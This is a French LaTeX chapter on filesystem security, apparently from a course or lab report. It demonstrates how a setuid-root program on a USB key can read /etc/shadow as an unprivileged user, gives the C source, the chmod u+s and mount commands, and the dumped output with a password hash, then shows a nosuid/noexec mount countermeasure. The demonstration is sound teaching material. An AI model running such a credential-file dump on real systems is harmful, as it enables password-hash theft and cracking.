\chapter{Sécurité des systèmes de fichier}

Surtout système linux, un exécutable qui possède le bit "s" à '1' est très dangereux. Il faut limiter le maximum d'application nécessitant ce bit. Voici un exemple concret, qui montre le danger de l'execution d'un tel programme.

\section{USB Hacking}

Imaginons un simple programme qui permet de lire le fichier "shadow" afin de pouvoir essayer de cracker les mots de passes.

Voici le code source :
\begin{lstlisting}[frame=single,style=C]  % Start your code-block

#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>



int main()
{
FILE *pFile;
char line [128];
char *p="";

    pFile = fopen ("/etc/shadow", "r");
    if (pFile)
    {
        memset (&line[0], 0, sizeof(line));
        for (;fgets (&line[0], sizeof(line)-1, pFile);)
        {
            printf ("%s", &line[0]);
            memset (&line[0], 0, sizeof(line));
        }
        fclose (pFile);
    }
    else
        printf ("Can not open the /etc/shadow file\n");
    
    //execl("./setuid_test", "./setuid_test", NULL);
    return 0;
\end{lstlisting}

On le compile, on copie l'exécutable sur la clé USB et on change le bit "s" de ses droits :
\begin{lstlisting}[frame=single,style=Bash]  % Start your code-block

# cp readShadowArm /media/usb_disk
# chown root.root readShadowArm
# chmod u+s readShadowArm
\end{lstlisting}

Sur la cible on monte la clé USB et on en vérifie les droits :
\begin{lstlisting}[frame=single,style=Bash]  % Start your code-block

# mkdir /tmpt/t
# mount -t ext4 /dev/sda2 /tmp/t
# cd /tmp/t
# ls -al
	-rwsrwxrwx    1 root     root          6705 May 21  2015 readShadowArm
\end{lstlisting}


Si on change d'utilisateur ("michael") et on essaie d'accéder à ce fichier :
\begin{lstlisting}[frame=single,style=Bash]  % Start your code-block

# su michael
# cat /etc/shadow
cat: can't open '/etc/shadow': Permission denied
# ./readShadowArm
root::10933:0:99999:7:::
bin:*:10933:0:99999:7:::
daemon:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
halt:*:10933:0:99999:7:::
uucp:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
ftp:*:10933:0:99999:7:::
nobody:*:10933:0:99999:7:::
sshd:*:::::::
michael:D67tqTzyZ8y7s:15706:0:99999:7:::

\end{lstlisting}

Bingo ! On a réussi à accéder à un fichier protégé à la base. Ceci nous montre le danger de l'exécution d'un tel programme (Il faut toutefois au préalable avoir les droit "root" pour monter la clé).

\pagebreak
\section{Contre mesures}
On peut contrer ce problème en limitant l'exécutions de tels fichiers. Pour cela, nous allons modifier les options de montage de "/tmp" dans le fichier "fstab".

\begin{lstlisting}[frame=single,style=Bash]  % Start your code-block

tmpfs   /tmp    tmpfs   rw,nosuid,noexec,nodev   0   0
\end{lstlisting}

Et si on refait les même manipulations, et que l'on lance le programme en tant que "michael" :
\begin{lstlisting}[frame=single,style=Bash]  % Start your code-block

# cp readShadowArm ../
# cd ../
# ./readShadowArm 
sh: ./readShadowArm: Permission denied
\end{lstlisting}

Donc on n'arrive pas à exécuter le fichier binaire, c'est bien ce que l'on à voulu. Par contre, si on exécute le programme directement sur la clé (montée sur "/tmp/t/"), on peut quand même l'exécuter. Ce n'est pas récurrent au point de montage /tmp. Donc, on voit qu'il faut bien faire attention à la sécurité d'un programme possédant le "s" bit activé.
